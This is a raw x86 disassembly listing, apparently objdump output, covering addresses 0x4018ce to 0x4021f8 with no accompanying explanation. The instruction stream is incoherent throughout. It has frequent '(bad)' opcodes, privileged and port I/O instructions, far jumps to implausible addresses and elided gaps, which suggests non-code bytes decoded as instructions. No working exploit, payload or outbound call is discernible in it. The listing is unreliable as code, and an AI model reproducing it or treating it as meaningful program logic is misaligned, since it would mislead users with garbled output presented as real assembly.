  4018ce:	or     eax,DWORD PTR [eax]
  4018d0:	mov    WORD PTR [eax],gs
  4018d2:	test   ah,ch
  4018d4:	cmp    al,0x23
  4018d6:	arpl   WORD PTR [edi],cx
  4018d8:	jl     0x401915
  4018da:	or     edi,eax
  4018dc:	(bad)  
  4018dd:	ins    BYTE PTR es:[edi],dx
  4018de:	int3   
  4018df:	inc    DWORD PTR [ebx-0x7295fc1f]
  4018e5:	pop    ss
  4018e6:	or     ebp,eax
  4018e8:	test   DWORD PTR [ecx+0xc],0x0
	...
  4018ff:	add    BYTE PTR [ebp+0x30],dl
  401902:	or     BYTE PTR [eax],al
  401904:	mov    ecx,0xb450e0f6
  401909:	aad    0x2e
  40190b:	adc    ah,cl
  40190d:	ins    DWORD PTR es:[edi],dx
  40190e:	repz jb 0x40189e
  401911:	inc    DWORD PTR cs:[ebx+0x740b75c1]
  401918:	xchg   esi,esi
  40191a:	pop    ecx
  40191b:	or     BYTE PTR [edi],al
  40191d:	pusha  
  40191e:	(bad)  
  40191f:	jne    0x4018b5
  401921:	add    bl,BYTE PTR [edx+0x8]
  401924:	push   ebp
  401925:	xor    BYTE PTR [eax],cl
  401927:	add    cl,al
  401929:	mul    al
  40192b:	or     DWORD PTR [eax+0x16],0x5c
  40192f:	pop    eax
  401930:	je     0x4018ba
  401932:	sbb    al,0x40
  401934:	mov    ebp,fs
  401936:	jp     0x401939
  401938:	iret   
  401939:	repnz push DWORD PTR [ebp-0x80]
  40193d:	xchg   esp,eax
  40193e:	jle    0x401981
  401940:	in     al,0x5b
  401942:	lods   al,BYTE PTR ds:[esi]
  401943:	test   DWORD PTR [esp+edx*4-0x35f8fc1f],0xee7e8ae9
  40194e:	loope  0x401946
  401950:	inc    ecx
  401951:	test   BYTE PTR [esi],dh
  401953:	jno    0x401915
  401955:	arpl   WORD PTR [ebx+edi*8-0x9161645],si
  40195c:	pop    esi
  40195d:	mov    BYTE PTR [eax],bh
  40195f:	ret    0x9498
  401962:	mov    esp,0x8a
	...
  401977:	add    BYTE PTR [eax+0x3cfc2517],dh
  40197d:	mov    esp,0xd47c8589
  401982:	loope  0x40197f
  401984:	(bad)  
  401985:	xchg   ebp,eax
  401986:	and    dh,bh
  401988:	dec    ebx
  401989:	fyl2xp1 
  40198b:	add    ecx,DWORD PTR [esp+edx*4+0x60c9bee1]
  401992:	loope  0x401997
  401994:	mov    WORD PTR [edx+edi*2-0xcf06bb0],ss
  40199b:	mov    cl,dl
  40199d:	pop    esp
  40199e:	xor    DWORD PTR [edx-0x72],ebp
  4019a1:	arpl   WORD PTR [eax+edi*8],si
  4019a4:	dec    ebx
  4019a5:	jmp    0x8cfa1073
  4019aa:	mov    esi,0x2c0fa051
  4019af:	cld    
  4019b0:	inc    ebp
  4019b1:	push   esi
  4019b2:	in     eax,0x3
  4019b4:	ror    DWORD PTR [edi],0x85
  4019b7:	or     BYTE PTR [eax+0x5c],0x31
  4019bb:	pop    esp
  4019bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019bd:	push   eax
  4019be:	icebp  
  4019bf:	inc    ebx
  4019c0:	mov    WORD PTR [ebx+esi*8+0x4],ds
  4019c4:	iret   
  4019c5:	bound  ebp,QWORD PTR [esi+0x8940440]
  4019cb:	jmp    0x250fae5f
  4019d0:	hlt    
  4019d1:	xchg   ebx,eax
  4019d2:	or     cl,ch
  4019d4:	(bad)  
  4019d5:	minps  xmm6,xmm1
  4019d8:	push   ss
  4019d9:	xchg   BYTE PTR [ebp+0xac],al
	...
  4019ef:	add    bh,dl
  4019f1:	ret    
  4019f2:	(bad)  
  4019f3:	call   0x473502d2
  4019f8:	cmp    al,0x5c
  4019fa:	div    DWORD PTR [edi+edx*4-0x3d22a59d]
  401a01:	call   0x634e5b06
  401a06:	mul    DWORD PTR [esi]
  401a08:	aas    
  401a09:	minps  xmm6,xmm1
  401a0c:	push   ss
  401a0d:	xchg   BYTE PTR [edx-0x17],ah
  401a10:	and    eax,0x9b94f794
  401a15:	bound  edi,QWORD PTR [ebp+0x1]
  401a18:	sub    al,0x0
  401a1b:	(bad)  
  401a1c:	fmul   QWORD PTR [eax+0x5cdc6250]
  401a22:	or     edx,DWORD PTR [ebx+ecx*4+0x6a5fd89d]
  401a29:	scas   eax,DWORD PTR es:[edi]
  401a2a:	enter  0x4eb0,0x8d
  401a2e:	or     BYTE PTR [ecx-0x16f76b71],dl
  401a34:	inc    esi
  401a35:	push   edi
  401a36:	add    cl,ch
  401a38:	fimul  DWORD PTR ds:0x614c6ae4
  401a3e:	pop    eax
  401a3f:	adc    DWORD PTR [eax-0x77d6e663],ebp
  401a45:	pop    esp
  401a46:	jp     0x401a30
  401a48:	dec    esp
  401a49:	(bad)  
  401a4a:	not    DWORD PTR [eax+edi*2]
  401a4d:	popa   
  401a4e:	jge    0x401a31
  401a50:	daa    
  401a51:	jmp    0x40a94d
	...
  401a66:	add    BYTE PTR [eax],al
  401a68:	sbb    DWORD PTR [esi+0x620800c8],ecx
  401a6e:	rol    dl,0xf1
  401a71:	xchg   ebp,eax
  401a72:	adc    DWORD PTR [ebp-0x13],0xc
  401a76:	sbb    cl,BYTE PTR [ebp-0xa7a358]
  401a7c:	enter  0xf785,0x75
  401a80:	icebp  
  401a81:	push   0xc642087d
  401a86:	add    al,0x85
  401a88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a89:	loopne 0x401aa6
  401a8b:	mov    edi,eax
  401a8d:	imul   esi,DWORD PTR [ebx],0xff2e545
  401a93:	mov    eax,0x895a4
  401a98:	dec    esi
  401a99:	bound  esp,QWORD PTR [edx]
  401a9b:	sar    BYTE PTR [esi-0x6a],0x23
  401a9f:	rcr    BYTE PTR [esi+edx*2+0x4],0x0
  401aa4:	fmul   DWORD PTR [esp+eiz*8]
  401aa7:	sub    DWORD PTR [ecx+0x5c],0x5e
  401aab:	push   eax
  401aac:	sub    eax,0x35119bed
  401ab1:	xchg   ebp,eax
  401ab2:	lock jb 0x401b19
  401ab5:	push   esp
  401ab6:	test   DWORD PTR [ebx+0x740899e0],0x875147b
  401ac0:	jne    0x401ab4
  401ac2:	movntps XMMWORD PTR ds:0x31c2c1c7,xmm4
  401ac9:	xchg   ebp,eax
  401aca:	mov    edi,DWORD PTR [ebp+0x0]
	...
  401add:	add    BYTE PTR [eax],al
  401adf:	add    BYTE PTR [ebp-0x6b],ah
  401ae2:	jge    0x401aee
  401ae4:	or     eax,0x25000896
  401ae9:	mov    ecx,0x839551c2
  401aef:	jne    0x401b12
  401af1:	and    BYTE PTR [ebp-0x4],cl
  401af4:	xor    eax,0x8c000895
  401af9:	test   BYTE PTR [esi+0x8],0x7
  401afd:	pop    ebp
  401afe:	mov    es,WORD PTR [ebp+0x8]
  401b01:	jnp    0x401b00
  401b03:	jne    0x401aa1
  401b05:	mov    ebp,edi
  401b07:	jne    0x401a8d
  401b09:	jmp    0x772:0x2b091059
  401b10:	mov    bh,0xab
  401b12:	pop    ebp
  401b13:	leave  
  401b14:	into   
  401b15:	outs   dx,BYTE PTR ds:[esi]
  401b16:	or     eax,DWORD PTR [ebx+0x750bc759]
  401b1c:	mov    edx,DWORD PTR [esi-0x532aa134]
  401b22:	lldt   WORD PTR [edi]
  401b25:	cmp    bh,bh
  401b27:	add    edi,DWORD PTR [ebx+edx*4-0x48c6efc9]
  401b2e:	mov    bl,0x1
  401b30:	mov    WORD PTR [ebx+0xb],gs
  401b33:	pop    esi
  401b34:	aad    0xac
  401b36:	sldt   WORD PTR [ecx-0xa]
  401b3a:	out    dx,eax
  401b3b:	or     eax,0x8bffec82
  401b41:	(bad)  
  401b42:	push   edx
  401b43:	push   0x0
	...
  401b58:	cwde   
  401b59:	cmp    ecx,DWORD PTR [ebx+0x0]
  401b5c:	je     0x401b3a
  401b5e:	or     al,bl
  401b60:	jae    0x401b76
  401b62:	or     ebp,DWORD PTR [edx-0x74]
  401b65:	ret    
  401b66:	punpckhdq mm1,QWORD PTR [ebx+eax*8+0x6d8c680f]
  401b6e:	or     eax,DWORD PTR [eax-0x180b36ad]
  401b74:	jg     0x401b92
  401b76:	or     al,0x0
  401b78:	adc    eax,0xc140f8b9
  401b7d:	jno    0x401b33
  401b7f:	ret    0x6d84
  401b82:	push   ebp
  401b83:	add    BYTE PTR [ecx],bl
  401b85:	xchg   ebp,eax
  401b86:	and    al,0xec
  401b88:	mov    esp,0x8c13e1ec
  401b8d:	xchg   esp,eax
  401b8e:	ins    BYTE PTR es:[edi],dx
  401b8f:	mov    DWORD PTR [eax+esi*2],edx
  401b92:	xchg   bl,dh
  401b94:	pop    esp
  401b95:	pop    edi
  401b96:	hlt    
  401b97:	out    dx,eax
  401b98:	hlt    
  401b99:	mov    DWORD PTR [eax+0x4],esi
  401b9c:	mov    WORD PTR [ebx+0x5f8279a1],cs
  401ba2:	cld    
  401ba3:	out    dx,eax
  401ba4:	hlt    
  401ba5:	(bad)  
  401ba6:	push   eax
  401ba7:	add    al,0x8c
  401ba9:	stos   DWORD PTR es:[edi],eax
  401baa:	and    DWORD PTR [ebp-0xd1e7332],edi
  401bb0:	pop    ecx
  401bb1:	pop    esp
  401bb2:	push   esp
  401bb3:	mov    esp,eax
  401bb5:	outs   dx,DWORD PTR ds:[esi]
  401bb6:	dec    esi
  401bb7:	repz pop esp
  401bb9:	pop    edi
  401bba:	mov    esp,0xff
	...
  401bcf:	add    BYTE PTR [ebx-0x4c0cc16f],dh
  401bd5:	adc    esp,DWORD PTR [ebx+ebp*8-0xc921674]
  401bdc:	sbb    DWORD PTR [eax+0x19],esp
  401bdf:	fstp   QWORD PTR [esp+edx*4-0x6b72541f]
  401be6:	loope  0x401beb
  401be8:	push   ebp
  401be9:	push   edx
  401bea:	stc    
  401beb:	add    ebx,ecx
  401bed:	or     eax,DWORD PTR ds:0x58ecd454
  401bf3:	push   ss
  401bf4:	int3   
  401bf5:	xchg   esp,eax
  401bf6:	stc    
  401bf7:	jne    0x401b86
  401bf9:	push   ebx
  401bfa:	out    dx,al
  401bfb:	pop    ebp
  401bfc:	mov    gs,edx
  401bfe:	loope  0x401bf2
  401c00:	loope  0x401b8e
  401c02:	leave  
  401c03:	xchg   ecx,eax
  401c04:	push   ecx
  401c05:	pop    edi
  401c06:	(bad)  
  401c07:	mov    esp,0x58e1984e
  401c0c:	pop    ss
  401c0d:	jo     0x401c20
  401c0f:	dec    esp
  401c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c11:	sbb    al,0x8
  401c13:	fcmovne st,st(7)
  401c15:	xchg   esp,eax
  401c16:	lock cmp edx,DWORD PTR [ecx-0x77ec08ad]
  401c1d:	jmp    0x16e0:0x8c949e08
  401c24:	sbb    eax,0xd1a0f75f
  401c29:	xchg   edi,eax
  401c2a:	or     BYTE PTR [ebx+eax*4],bl
  401c2d:	jo     0x401bba
  401c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c30:	out    0xc3,eax
  401c32:	push   eax
  401c33:	add    DWORD PTR [eax],eax
	...
  401c45:	add    BYTE PTR [eax],al
  401c47:	add    dl,al
  401c49:	or     DWORD PTR [eax-0x17],0x2a09e1f7
  401c50:	ficomp WORD PTR [esi+0x7d]
  401c53:	in     eax,dx
  401c54:	push   cs
  401c55:	f2xm1  
  401c57:	cs inc esp
  401c59:	pusha  
  401c5a:	or     cl,ch
  401c5c:	(bad)  
  401c5d:	xchg   esp,eax
  401c5e:	(bad)  
  401c5f:	jmp    0x3e450522
  401c64:	xor    al,0x8c
  401c66:	loopne 0x401c0e
  401c68:	mov    esp,0x4462f75e
  401c6d:	mov    WORD PTR [ebx-0xb176105],es
  401c73:	push   ds
  401c74:	adc    al,0x5c
  401c76:	neg    DWORD PTR [edi+edx*4+0x48f15a5d]
  401c7d:	push   ebx
  401c7e:	add    cl,ch
  401c80:	in     al,0x9
  401c82:	in     al,0x99
  401c84:	(bad)  
  401c85:	in     al,dx
  401c86:	adc    dl,bl
  401c88:	iret   
  401c89:	xchg   esp,eax
  401c8a:	lock jnp 0x401c1d
  401c8d:	push   ecx
  401c8e:	not    DWORD PTR [ebx-0x78]
  401c91:	pop    ebp
  401c92:	jge    0x401c85
  401c94:	aaa    
  401c95:	aaa    
  401c96:	not    esi
  401c98:	pop    ebp
  401c99:	dec    esp
  401c9a:	retf   0x8fe5
  401c9d:	mov    DWORD PTR [ebx+0x5de05900],0x8aea614
  401ca7:	jne    0x401cca
  401ca9:	sbb    ecx,edx
  401cab:	adc    BYTE PTR [eax],al
	...
  401cbd:	add    BYTE PTR [eax],al
  401cbf:	add    BYTE PTR ds:0xea107d65,dh
  401cc5:	in     eax,0x4
  401cc7:	inc    DWORD PTR [eax-0x71910a0]
  401ccd:	arpl   di,si
  401ccf:	mov    eax,eax
  401cd1:	jl     0x401cfc
  401cd3:	add    bh,BYTE PTR [edi+edx*2]
  401cd6:	sbb    BYTE PTR [eax],al
  401cd8:	mov    al,ds:0x2183e4df
  401cdd:	div    DWORD PTR gs:[ebp-0x37]
  401ce1:	mov    edi,0x6e308d0c
  401ce6:	pop    eax
  401ce7:	inc    eax
  401ce9:	pop    ecx
  401cea:	out    dx,eax
  401ceb:	ret    
  401cec:	cmp    ah,BYTE PTR [ebx-0x9]
  401cef:	mov    esi,eax
  401cf1:	pop    ebp
  401cf2:	mov    bh,BYTE PTR [eax]
  401cf4:	mov    ch,0xe5
  401cf6:	jnp    0xc8478aec
  401cfc:	dec    esi
  401cfd:	xchg   esi,eax
  401cfe:	and    eax,eax
  401d00:	ins    BYTE PTR es:[edi],dx
  401d01:	push   esi
  401d02:	add    BYTE PTR [eax],al
  401d04:	loopne 0x401ce6
  401d06:	in     al,0x83
  401d08:	jno    0x401d6e
  401d0a:	div    DWORD PTR [ebp-0x57]
  401d0d:	mov    edi,0x63308d0a
  401d12:	pop    eax
  401d13:	inc    DWORD PTR [eax]
  401d15:	pop    edx
  401d16:	out    dx,eax
  401d17:	xchg   edi,eax
  401d18:	jp     0x401d7e
  401d1a:	test   DWORD PTR [ebx+0x388a5d20],0xf00e575
	...
  401d38:	add    dl,dh
  401d3a:	test   BYTE PTR [esi+0x2b0a4031],0x8c
  401d41:	sub    esi,DWORD PTR [edx+0x5e6b94c2]
  401d47:	mov    esi,DWORD PTR [eax]
  401d49:	jmp    0x6a08:0xa83bfccf
  401d50:	(bad)  
  401d51:	clc    
  401d52:	dec    esi
  401d53:	(bad)  
  401d54:	mov    esp,0x34087e2e
  401d59:	cmp    ecx,0x4ee21bff
  401d5f:	or     al,0xf
  401d61:	inc    ebx
  401d62:	or     esi,DWORD PTR [edx+edx*4+0x3e]
  401d66:	mov    cl,0x45
  401d68:	add    eax,DWORD PTR [edx]
  401d6a:	or     eax,0xcd23cc2b
  401d6f:	or     BYTE PTR [eax+eax*4-0x77e8138b],cl
  401d76:	sbb    al,0x83
  401d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d79:	imul   edi,DWORD PTR [esi+0x4],0xffffffc5
  401d7d:	test   al,0xf7
  401d7f:	call   edx
  401d81:	aas    
  401d82:	idiv   esi
  401d84:	inc    ecx
  401d85:	jae    0x401d5a
  401d87:	rol    al,1
  401d89:	aad    0xf8
  401d8b:	or     ecx,esp
  401d8d:	daa    
  401d8e:	hlt    
  401d8f:	mov    bl,BYTE PTR [ecx+0x3b]
  401d92:	rol    BYTE PTR [edx],0x8c
  401d95:	imul   ecx,DWORD PTR [ebx],0x0
  401d98:	mov    bh,0x67
  401d9a:	push   ebp
  401d9b:	add    DWORD PTR [eax],eax
	...
  401dad:	add    BYTE PTR [eax],al
  401daf:	add    BYTE PTR [ebx+0x19fef707],bl
  401db5:	jae    0x401d8a
  401db7:	cmp    eax,0xc9f88b88
  401dbc:	dec    esi
  401dbd:	bound  ecx,QWORD PTR [ebx]
  401dbf:	push   ebp
  401dc0:	pop    es
  401dc1:	mov    cl,BYTE PTR [esp+eax*8+0x7573fc70]
  401dc8:	cwde   
  401dc9:	pop    ss
  401dca:	or     ecx,DWORD PTR [ebp+0x54ed94c9]
  401dd0:	pop    ebx
  401dd1:	loop   0x401dc4
  401dd3:	push   ebp
  401dd4:	push   ebx
  401dd5:	loop   0x401dc0
  401dd7:	fcmovnbe st,st(6)
  401dd9:	imul   esp,ecx,0x3
  401ddc:	xchg   edi,eax
  401ddd:	push   esp
  401dde:	xor    eax,0xb5da0f06
  401de3:	add    al,0xb9
  401de5:	xchg   ebx,eax
  401de6:	or     al,ah
  401de8:	retf   0xa34d
  401deb:	add    BYTE PTR [edi+ecx*1+0x648ff024],cl
  401df2:	fmul   DWORD PTR [eax+0x7c]
  401df5:	loope  0x401da9
  401df7:	lods   al,BYTE PTR ds:[esi]
  401df8:	lea    edx,[ecx+eiz*8-0x5cb29dfd]
  401dff:	add    BYTE PTR [ecx+eax*8+0x510de07a],cl
  401e06:	stc    
  401e07:	out    dx,al
  401e08:	jmp    0x401e65
  401e0a:	adc    bl,BYTE PTR [ebx]
  401e0c:	(bad)  
  401e0d:	out    dx,al
  401e0e:	loope  0x401e69
  401e10:	mov    esi,gs
  401e12:	jecxz  0x401e6d
	...
  401e28:	mov    esi,gs
  401e2a:	loop   0x401e87
  401e2c:	mov    WORD PTR [ecx+eiz*8-0x21e3c3d],ss
  401e33:	fstp   TBYTE PTR [edx+ebp*2-0x2dfafc1f]
  401e3a:	cmp    eax,0x26c72044
  401e3f:	jns    0x401dd5
  401e41:	ins    BYTE PTR es:[edi],dx
  401e42:	fsub   st(5),st
  401e44:	fwait
  401e45:	pop    ebx
  401e46:	cs dec ecx
  401e48:	xchg   esp,eax
  401e49:	xchg   esp,eax
  401e4a:	loope  0x401e4f
  401e4c:	mov    WORD PTR [edi],cs
  401e4e:	mov    esp,0x7c8616fb
  401e53:	dec    ecx
  401e54:	je     0x401e1a
  401e56:	cdq    
  401e57:	or     DWORD PTR [esp+edx*4+0x110ce908],0x70
  401e5f:	out    dx,al
  401e60:	jb     0x401ebd
  401e62:	pop    eax
  401e63:	out    0xd4,al
  401e65:	mov    edi,?
  401e67:	cmp    ecx,DWORD PTR [edi+edx*1-0x1e702e8b]
  401e6e:	or     ebp,DWORD PTR [edx]
  401e70:	addr16 jl 0x401e6a
  401e73:	cmp    al,0x28
  401e75:	or     DWORD PTR [ebp-0x8a4dcbf],ecx
  401e7b:	sbb    DWORD PTR [ebx],edi
  401e7d:	loope  0x401e73
  401e7f:	sar    DWORD PTR [eax+0x16a6f75b],0x1b
  401e86:	jl     0x401e73
  401e88:	ss sbb edi,esi
  401e8b:	sbb    al,0x0
	...
  401e9d:	add    BYTE PTR [eax],al
  401e9f:	add    ah,bh
  401ea1:	imul   ebp,DWORD PTR [ebx-0x7c6b7081],0xffffffaa
  401ea8:	inc    esi
  401ea9:	dec    ebp
  401eaa:	retf   0x8ff1
  401ead:	rol    DWORD PTR [ebx-0xfaff17b],0x6e
  401eb4:	fs mov al,ah
  401eb7:	mov    esi,esp
  401eb9:	pop    edx
  401eba:	div    DWORD PTR [eax+0x44]
  401ebd:	pop    esp
  401ebe:	iret   
  401ebf:	lods   al,BYTE PTR ds:[esi]
  401ec0:	mov    ebx,0x8fe90893
  401ec5:	pop    ebx
  401ec6:	jge    0x401ebd
  401ec8:	xlat   BYTE PTR ds:[ebx]
  401ec9:	push   ds
  401eca:	cmc    
  401ecb:	mov    ds:0x26e55d0e,al
  401ed1:	xchg   BYTE PTR [edx-0x17],ah
  401ed4:	inc    ebp
  401ed5:	xchg   esp,eax
  401ed6:	neg    DWORD PTR [ebx+ebp*4-0x5dde82a6]
  401edd:	loopne 0x401edf
  401edf:	push   ss
  401ee0:	add    al,0x89
  401ee2:	idiv   DWORD PTR [ebx+0xca4b93]
  401ee8:	jge    0x401e80
  401eea:	pop    ebp
  401eeb:	mov    eax,DWORD PTR [ecx-0x450733ea]
  401ef1:	int3   
  401ef2:	lock add BYTE PTR [ebp-0x6a],dh
  401ef6:	or     bh,al
  401ef8:	test   al,0x64
  401efa:	or     BYTE PTR [eax],al
  401efc:	gs xchg esi,eax
  401efe:	adc    DWORD PTR [ebp+0x2d],0xffffffdd
  401f02:	sbb    cl,BYTE PTR [ebp+0x0]
	...
  401f18:	push   0x246a5868
  401f1d:	imul   edi,DWORD PTR [ebp-0x4],0xfff0e1f2
  401f24:	push   0x3952f658
  401f29:	fisttp QWORD PTR [ebp-0x8]
  401f2c:	fcom   QWORD PTR [esi+0xc]
  401f2f:	add    BYTE PTR [eax-0x25],bl
  401f32:	in     al,0x6a
  401f34:	hlt    
  401f35:	fimul  DWORD PTR [ebp+0xc]
  401f38:	lds    esp,FWORD PTR [edi+0x7d]
  401f3b:	or     BYTE PTR ds:0x72fff4a4,bl
  401f41:	sbb    eax,0xc2f508ca
  401f46:	sub    esp,0xffffff8f
  401f49:	mov    WORD PTR [ebp-0x83a1ebb],es
  401f4f:	jne    0x401f2e
  401f51:	cmp    eax,0x6762fc16
  401f56:	rol    edx,0xad
  401f59:	xchg   ebp,eax
  401f5a:	pop    ebp
  401f5b:	mov    esp,DWORD PTR [ecx+0x13]
  401f5e:	jne    0x401f6c
  401f60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f61:	loope  0x401f7f
  401f63:	and    eax,0xffffff85
  401f66:	or     BYTE PTR [ebx+eax*8+0x68],dh
  401f6a:	jge    0x401f7c
  401f6c:	jb     0x401f4f
  401f6e:	add    al,0xff
  401f70:	clc    
  401f71:	pop    ebp
  401f72:	out    dx,eax
  401f73:	std    
  401f74:	mov    WORD PTR [esi-0x52aa001b],es
  401f7a:	or     BYTE PTR [eax],al
	...
  401f90:	loope  0x401f78
  401f92:	call   0xe47c1996
  401f97:	jne    0x401f2d
  401f99:	xchg   ebx,eax
  401f9a:	mov    eax,0x886a63ff
  401f9f:	jge    0x40201d
  401fa1:	imul   edi,DWORD PTR [edi+0x14],0xf
  401fa5:	mov    eax,0x71c00008
  401faa:	in     al,0x75
  401fac:	pushf  
  401fad:	dec    edx
  401fae:	jle    0x401fbc
  401fb0:	cmp    ebx,DWORD PTR [eax+0x19fbe7f4]
  401fb6:	in     al,0xff
  401fb8:	push   ebp
  401fb9:	sub    eax,0xf6b8fff7
  401fbe:	xlat   BYTE PTR ds:[ebx]
  401fbf:	sbb    DWORD PTR [ecx-0x798bf4a1],0xfffffffa
  401fc6:	jge    0x401fd4
  401fc8:	hlt    
  401fc9:	mov    esp,0x168c00d6
  401fce:	or     DWORD PTR [ebx],ebp
  401fd0:	int3   
  401fd1:	jp     0x401fb8
  401fd3:	jne    0x401f55
  401fd5:	fidivr DWORD PTR [esi+0x8]
  401fd8:	hlt    
  401fd9:	popf   
  401fda:	in     al,0xff
  401fdc:	jecxz  0x402011
  401fde:	leave  
  401fdf:	or     BYTE PTR [eax+ebx*1+0x3fd3ec70],cl
  401fe6:	repz out 0x73,eax
  401fe9:	ret    0xffe4
  401fec:	pop    esp
  401fed:	push   ebp
  401fee:	repz addr16 pusha 
  401ff1:	and    ecx,DWORD PTR [edx+0x0]
	...
  402008:	mov    bl,0x1f
  40200a:	repz out 0x1f,eax
  40200d:	mov    ds:0x6b36ffe4,al
  402012:	in     al,0x75
  402014:	test   BYTE PTR [ecx+ebx*1+0x16589357],dl
  40201b:	pop    ecx
  40201c:	mov    cs,WORD PTR [ecx]
  40201e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40201f:	call   ebx
  402021:	push   edi
  402022:	pushf  
  402023:	sti    
  402024:	jae    0x401fe2
  402026:	push   cs
  402027:	in     al,dx
  402028:	jae    0x402015
  40202a:	jecxz  0x4020aa
  40202c:	rol    DWORD PTR [ecx+edx*4+0x98cd9ec],1
  402033:	ds pop ebx
  402035:	pop    eax
  402036:	out    dx,al
  402037:	dec    esp
  402038:	inc    ebp
  402039:	push   ebx
  40203a:	in     eax,0x3
  40203c:	loope  0x402049
  40203e:	int    0x87
  402040:	dec    eax
  402041:	pop    ecx
  402042:	(bad)  
  402043:	jno    0x401fc9
  402045:	ins    BYTE PTR es:[edi],dx
  402046:	adc    esi,ebp
  402048:	xor    ebx,DWORD PTR [eax+0x1a]
  40204b:	inc    ecx
  40204c:	cwde   
  40204d:	or     eax,0xd20fe824
  402052:	aad    0xfb
  402054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402055:	xchg   esp,eax
  402056:	scas   al,BYTE PTR es:[edi]
  402057:	jno    0x401fd9
  402059:	push   edi
  40205a:	sbb    al,0xfc
  40205c:	repz xchg esp,eax
  40205e:	fwait
  40205f:	jmp    0x402064
  402061:	pop    eax
  402062:	sbb    al,0xe8
  402064:	sti    
  402065:	loope  0x402060
  402067:	fisttp DWORD PTR [edi+0xeb7657]
	...
  40207d:	add    BYTE PTR [eax],al
  40207f:	add    bl,ch
  402081:	loope  0x40206c
  402083:	fistp  DWORD PTR [eax+0x7eb6658]
  402089:	shr    BYTE PTR [ebp-0x43],cl
  40208c:	into   
  40208d:	mov    ecx,fs
  40208f:	push   eax
  402090:	pop    ss
  402091:	imul   esp,DWORD PTR [edx-0x40],0xefac4fb8
  402098:	mov    WORD PTR [ecx+eiz*8+0x35d20103],ss
  40209f:	push   esp
  4020a0:	stos   DWORD PTR es:[edi],eax
  4020a1:	loope  0x4020ab
  4020a3:	loope  0x40206c
  4020a5:	scas   al,BYTE PTR es:[edi]
  4020a6:	out    0xe9,al
  4020a8:	(bad)  
  4020a9:	adc    eax,ecx
  4020ab:	mov    eax,ds:0xf17d5774
  4020b0:	addr16 pop edx
  4020b2:	icebp  
  4020b3:	push   ss
  4020b4:	ja     0x4020c3
  4020b6:	dec    ebp
  4020b7:	adc    DWORD PTR [edi-0x1f],esp
  4020ba:	hlt    
  4020bb:	adc    DWORD PTR [edi+0x68],edx
  4020be:	or     cl,ch
  4020c0:	push   0x17
  4020c2:	jl     0x4020a3
  4020c4:	jbe    0x4020a7
  4020c6:	lock cdq 
  4020c8:	mov    ecx,0x8d58e094
  4020cd:	xchg   esp,eax
  4020ce:	or     BYTE PTR [eax-0x34],dh
  4020d1:	pusha  
  4020d2:	neg    DWORD PTR [esp+esi*1+0x6c]
  4020d6:	sar    DWORD PTR [ebp+0x3cf7948f],cl
  4020dc:	xor    BYTE PTR [edi-0x2d],ch
  4020df:	ret    0x5736
  4020e2:	sub    DWORD PTR [eax+eax*1],0x0
	...
  4020f6:	add    BYTE PTR [eax],al
  4020f8:	sbb    al,0x87
  4020fa:	shl    BYTE PTR [esi+0x1cf7c43f],0x10
  402101:	outs   dx,DWORD PTR ds:[esi]
  402102:	call   0x3ab:0xc156f69f
  402109:	push   edi
  40210a:	pop    esp
  40210b:	(bad)  
  40210d:	adc    cl,ah
  40210f:	jns    0x4020df
  402111:	sar    ah,1
  402113:	jmp    0x6448b5a7
  402118:	dec    esp
  402119:	pop    eax
  40211a:	pop    eax
  40211b:	outs   dx,BYTE PTR ds:[esi]
  40211c:	pop    esp
  40211d:	mov    eax,fs
  40211f:	sub    DWORD PTR [ebx+edx*4-0x24309bf8],esi
  402126:	inc    ebp
  402127:	push   esi
  402128:	cmp    al,0x8c
  40212a:	loopne 0x4021a1
  40212c:	test   al,0x56
  40212e:	test   DWORD PTR [eax],0x83f0d43c
  402134:	call   0x89b22da3
  402139:	pcmpgtw mm7,mm0
  40213c:	mov    cl,0x69
  40213e:	jge    0x40213c
  402140:	jge    0x40212c
  402142:	in     al,0x0
  402144:	jne    0x40219d
  402146:	mov    bh,0x74
  402148:	imul   edi,DWORD PTR [di-0x8],0x35
  40214d:	mov    eax,0x9564e808
  402152:	or     BYTE PTR [eax],al
  402154:	jp     0x402170
  402156:	call   eax
  402158:	in     al,dx
  402159:	aam    0xfc
  40215b:	inc    DWORD PTR [eax]
	...
  40216d:	add    BYTE PTR [eax],al
  40216f:	add    al,ah
  402171:	ins    DWORD PTR es:[edi],dx
  402172:	loopne 0x4021db
  402174:	cmp    DWORD PTR [ecx+0x6d43eb08],edx
  40217a:	jge    0x402184
  40217c:	dec    ebp
  40217d:	mov    dh,0xf3
  40217f:	dec    DWORD PTR [edx+0x78]
  402182:	enter  0xe7c9,0x94
  402186:	or     bl,ch
  402188:	xor    edi,DWORD PTR [ecx-0x38]
  40218b:	leave  
  40218c:	not    DWORD PTR [eax+ecx*1-0xb47d896]
  402193:	push   DWORD PTR [eax+0x58]
  402196:	out    dx,eax
  402197:	add    al,0x2c
  402199:	ins    BYTE PTR es:[edi],dx
  40219a:	test   edi,0x960b0
  4021a0:	in     eax,0x91
  4021a2:	test   DWORD PTR [ebp+0x75],eax
  4021a5:	shl    bh,0x75
  4021a8:	fnstsw WORD PTR [ecx]
  4021aa:	repnz sti 
  4021ac:	pop    edx
  4021ad:	imul   ecx,DWORD PTR [ebx+0x7c90557d],0x12
  4021b4:	ficomp DWORD PTR [ecx]
  4021b6:	xor    eax,DWORD PTR [ebp+0x61]
  4021b9:	in     eax,0xf
  4021bb:	mov    eax,0xb6c8c
  4021c0:	mov    edx,ss
  4021c2:	or     ch,BYTE PTR [ebx]
  4021c4:	int3   
  4021c5:	ret    0x2b0e
  4021c8:	int3   
  4021c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021ca:	into   
  4021cb:	add    al,0x8c
  4021cd:	clc    
  4021ce:	jae    0x4021bc
  4021d0:	cmpxchg ah,ah
  4021d3:	lea    eax,[eax]
	...
  4021e5:	add    BYTE PTR [eax],al
  4021e7:	add    BYTE PTR [ecx-0x51],cl
  4021ea:	pop    esp
  4021eb:	inc    DWORD PTR [ecx]
  4021ed:	rcr    DWORD PTR fs:[edx],cl
  4021f0:	jno    0x40225d
  4021f2:	or     eax,DWORD PTR [ebp-0xebfcb4]
  4021f8:	stc    
